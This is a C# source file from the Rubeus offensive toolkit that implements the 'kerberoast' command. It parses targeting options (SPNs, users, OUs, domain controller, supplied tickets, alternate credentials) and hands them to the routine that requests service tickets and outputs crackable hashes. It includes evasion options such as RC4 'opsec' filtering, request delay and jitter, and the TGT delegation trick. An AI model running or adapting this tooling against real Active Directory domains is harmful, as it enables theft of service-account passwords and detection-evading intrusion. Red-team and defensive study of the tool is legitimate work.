using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text;
using Rubeus.Domain;


namespace Rubeus.Commands
{
    public class Kerberoast : ICommand
    {
        public static string CommandName => "kerberoast";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("\r\n[*] Action: Kerberoasting\r\n");

            KerberoastSettings settings = new KerberoastSettings();

            if (arguments.ContainsKey("/spn"))
            {
                // roast a specific single SPN
                settings.Spns = new List<string>();
                settings.Spns.Add(arguments["/spn"]);
            }

            if (arguments.ContainsKey("/spns"))
            {
                settings.Spns = new List<string>();
                if (System.IO.File.Exists(arguments["/spns"]))
                {
                    string fileContent = Encoding.UTF8.GetString(System.IO.File.ReadAllBytes(arguments["/spns"]));
                    foreach (string s in fileContent.Split('\n'))
                    {
                        if (!String.IsNullOrEmpty(s))
                        {
                            settings.Spns.Add(s.Trim());
                        }
                    }
                }
                else
                {
                    foreach (string s in arguments["/spns"].Split(','))
                    {
                        settings.Spns.Add(s);
                    }
                }
            }
            if (arguments.ContainsKey("/user"))
            {
                // roast a specific user (or users, comma-separated
                settings.Username = arguments["/user"];
            }
            if (arguments.ContainsKey("/ou"))
            {
                // roast users from a specific OU
                settings.OuPath = arguments["/ou"];
            }
            if (arguments.ContainsKey("/domain"))
            {
                // roast users from a specific domain
                settings.Domain.DomainName = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                // use a specific domain controller for kerberoasting
                settings.Domain.DomainController = arguments["/dc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                // output kerberoasted hashes to a file instead of to the console
                settings.OutputFilePath = arguments["/outfile"];
            }
            if (arguments.ContainsKey("/simple"))
            {
                // output kerberoasted hashes to the output file format instead, to the console
                settings.SimpleOutput = true;
            }
            if (arguments.ContainsKey("/aes"))
            {
                // search for users w/ AES encryption enabled and request AES tickets
                settings.EncryptionMode = KerberoastSettings.ETypeMode.Aes;
            }
            if (arguments.ContainsKey("/rc4opsec"))
            {
                // search for users without AES encryption enabled roast
                settings.EncryptionMode = KerberoastSettings.ETypeMode.Rc4Opsec;
            }
            if (arguments.ContainsKey("/ticket"))
            {
                // use an existing TGT ticket when requesting/roasting
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    settings.Tgt = new KRB_CRED(kirbiBytes);
                }
                else if (System.IO.File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = System.IO.File.ReadAllBytes(kirbi64);
                    settings.Tgt = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine("\r\n[X] /ticket:X must either be a .kirbi file or a base64 encoded .kirbi\r\n");
                }
            }

            if (arguments.ContainsKey("/usetgtdeleg") || arguments.ContainsKey("/tgtdeleg"))
            {
                // use the TGT delegation trick to get a delegated TGT to use for roasting
                settings.UseTgtDelegationTrick = true;
            }

            if (arguments.ContainsKey("/pwdsetafter"))
            {
                // filter for roastable users w/ a pwd set after a specific date
                settings.PasswordSetAfter = arguments["/pwdsetafter"];
            }

            if (arguments.ContainsKey("/pwdsetbefore"))
            {
                // filter for roastable users w/ a pwd set before a specific date
                settings.PasswordSetBefore = arguments["/pwdsetbefore"];
            }

            if (arguments.ContainsKey("/ldapfilter"))
            {
                // additional LDAP targeting filter
                settings.LdapFilter = arguments["/ldapfilter"].Trim('"').Trim('\'');
            }

            if (arguments.ContainsKey("/resultlimit"))
            {
                // limit the number of roastable users
                settings.ResultsLimit = Convert.ToInt32(arguments["/resultlimit"]);
            }

            if (arguments.ContainsKey("/delay"))
            {
                settings.Delay = Convert.ToInt32(arguments["/delay"]);
                if (settings.Delay < 100)
                {
                    Console.WriteLine("[!] WARNING: delay is in milliseconds! Please enter a value > 100.");
                    return;
                }
            }

            if (arguments.ContainsKey("/jitter"))
            {
                try
                {
                    settings.Jitter = Convert.ToInt32(arguments["/jitter"]);
                }
                catch
                {
                    Console.WriteLine("[X] Jitter must be an integer between 1-100.");
                    return;
                }
                if (settings.Jitter <= 0 || settings.Jitter > 100)
                {
                    Console.WriteLine("[X] Jitter must be between 1-100");
                    return;
                }
            }

            if (arguments.ContainsKey("/stats"))
            {
                // output stats on the number of kerberoastable users, don't actually roast anything
                settings.NoTgsRequests = true;
            }

            if (arguments.ContainsKey("/enterprise"))
            {
                // use enterprise principals in the request, requires /spn and (/ticket or /tgtdeleg)
                settings.Enterprise = true;
            }
            if (arguments.ContainsKey("/autoenterprise"))
            {
                // use enterprise principals in the request if roasting with the SPN fails, requires /ticket or /tgtdeleg, does nothing is /spn or /spns is supplied
                settings.AutoEnterprise = true;
            }
            if (arguments.ContainsKey("/ldaps"))
            {
                settings.Domain.Ldaps = true;
            }

            if (String.IsNullOrEmpty(settings.Domain.DomainName))
            {
                // try to get the current domain
                settings.Domain.DomainName = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
            }

            if (arguments.ContainsKey("/creduser"))
            {
                // provide an alternate user to use for connection creds
                if (!Regex.IsMatch(arguments["/creduser"], ".+\\.+", RegexOptions.IgnoreCase))
                {
                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
                    return;
                }

                string[] parts = arguments["/creduser"].Split('\\');
                string domainName = parts[0];
                string userName = parts[1];

                // provide an alternate password to use for connection creds
                if (!arguments.ContainsKey("/credpassword"))
                {
                    Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                    return;
                }

                string password = arguments["/credpassword"];
                settings.Domain.Credentials = new System.Net.NetworkCredential(userName, password, domainName);
            }
            Roast.Kerberoast(settings);
        }
    }
}